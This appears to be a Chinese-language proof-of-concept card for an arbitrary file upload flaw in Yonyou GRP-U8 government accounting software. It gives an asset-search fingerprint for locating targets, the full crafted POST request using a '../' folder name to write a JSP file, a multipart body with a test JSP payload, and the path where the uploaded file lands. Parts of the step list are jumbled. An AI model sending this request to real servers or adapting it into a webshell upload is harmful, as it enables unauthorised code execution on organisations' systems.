# 用友GRP-U8UploadFileData存在任意文件上传漏洞

- **系统**：用友　|　**类型**：文件上传　|　**CVE**：—
- **指纹**：`app.name="用友GRP-U8 OA"`
- **请求**：`POST /UploadFileData?action=upload_file&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&foldername=%2e%2e%2f&filename=1.jsp&filename=1.jpg HTTP/1.1`

**请求体 / payload**
```
1.访问`UploadFileData`接口响应200表示可能存在漏洞\

出现如下情况则表示漏洞已修复\
2. 通过poc上传文件
Host: xx.xx.xx.xx
Cookie: JSESSIONID=59227D2C93FE3E8C2626DA625CE710F9
Content-Type: multipart/form-data
Content-Length: 170
------WebKitFormBoundary92pUawKc
Content-Disposition: form-data; name="myFile";filename="test.jpg"
<% out.println("0xold6");%>
------WebKitFormBoundary92pUawKc--
3. 上传文件位置
/R9iPortal/1.jsp
```

**其他**
- 用友GRP-U8 UploadFileData存在任意文件上传漏洞: * 一、漏洞简介
* 二、影响版本
* 三、资产测绘
* 四、漏洞复现
***
- 版本: * 用友GRP-U8 行政事业内控管理软件（新政府会计制度专版）
* 用友GRP-U8 高校内控管理软件（Manager版）